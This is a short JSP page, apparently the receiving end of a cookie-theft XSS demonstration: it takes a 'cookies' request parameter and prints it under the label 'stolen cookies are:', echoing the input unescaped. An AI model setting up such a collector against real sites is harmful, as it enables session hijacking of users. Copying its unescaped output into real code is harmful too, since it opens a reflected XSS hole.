<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>盗取的cookie</title>

	<script src="js/jquery1.10.js" type="text/javascript"></script>
	<script type="text/javascript">
		$(document).ready(function(){
		});
	</script>

</head>
<body>
	<%
		String cookies = request.getParameter("cookies");
		out.println("盗取的cookies是： "+cookies);
	%>
</body>
</html>